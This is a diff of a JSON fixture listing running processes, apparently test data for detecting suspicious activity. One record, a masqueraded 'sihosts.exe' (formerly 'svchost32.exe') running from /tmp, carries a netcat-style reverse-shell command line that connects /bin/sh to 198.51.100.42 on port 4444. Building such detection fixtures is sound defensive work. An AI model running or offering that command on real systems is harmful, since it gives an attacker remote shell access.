@@ -2,9 +2,9 @@
   {"Pid": 1,    "PPid": 0,    "Name": "systemd",          "Exe": "/sbin/systemd",            "CommandLine": "/sbin/init"},
   {"Pid": 412,  "PPid": 1,    "Name": "sshd",              "Exe": "/usr/sbin/sshd",           "CommandLine": "/usr/sbin/sshd -D"},
   {"Pid": 891,  "PPid": 1,    "Name": "cron",              "Exe": "/usr/sbin/cron",           "CommandLine": "/usr/sbin/cron -f"},
-  {"Pid": 1024, "PPid": 1,    "Name": "python3",           "Exe": "/usr/bin/python3",         "CommandLine": "/usr/bin/python3 /opt/meridian/app.py"},
+  {"Pid": 1024, "PPid": 1,    "Name": "python3",           "Exe": "/usr/bin/python3",         "CommandLine": "/usr/bin/python3 /opt/corp-app/app.py"},
   {"Pid": 3201, "PPid": 412,  "Name": "bash",              "Exe": "/bin/bash",                "CommandLine": "-bash"},
-  {"Pid": 3847, "PPid": 3201, "Name": "svchost32.exe",     "Exe": "/tmp/svchost32.exe",       "CommandLine": "/tmp/svchost32.exe -e /bin/sh 198.51.100.42 4444"},
+  {"Pid": 3847, "PPid": 3201, "Name": "sihosts.exe",       "Exe": "/tmp/sihosts.exe",         "CommandLine": "/tmp/sihosts.exe -e /bin/sh 198.51.100.42 4444"},
   {"Pid": 4012, "PPid": 1,    "Name": "nginx",             "Exe": "/usr/sbin/nginx",          "CommandLine": "nginx: master process /usr/sbin/nginx"},
   {"Pid": 4201, "PPid": 4012, "Name": "nginx",             "Exe": "/usr/sbin/nginx",          "CommandLine": "nginx: worker process"}
 ]
